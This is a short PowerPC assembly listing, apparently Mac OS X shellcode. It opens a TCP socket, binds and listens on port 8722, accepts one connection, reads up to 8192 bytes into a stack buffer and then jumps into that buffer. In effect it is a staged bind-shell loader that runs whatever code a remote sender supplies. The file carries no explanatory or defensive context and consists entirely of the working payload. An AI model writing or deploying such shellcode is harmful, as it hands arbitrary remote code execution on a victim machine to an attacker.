.globl _main
.text
_main:
	;; socket
	li	r3, 2
	li	r4, 1
	li	r5, 6
	li	r0, 97
        sc
	xor	r0, r0, r0
	mr 	r30, r3

	bl bind
	.long 0x00022212
	.long 0x00000000

bind:	
	mflr	r4
	li	r5, 0x10
	li	r0, 104
	mr	r3, r30
	sc
	xor	r0, r0, r0


listen:
	li	r0, 106
	mr	r3, r30
	sc
        xor     r0, r0, r0

accept:
	mr	r3, r30
	li	r0, 30
	li	r4, 16
	stw	r4, -24(r1)
	subi	r5, r1, 24
	subi	r4, r1, 16
	sc
	xor     r0, r0, r0
	mr	r30, r3

reader:
	li		r0, 3
	mr		r3, r30
	subi	r4, r1, 8192
	li		r5, 8192
	mtlr	r4
	sc
	xor		r0, r0, r0
	blr
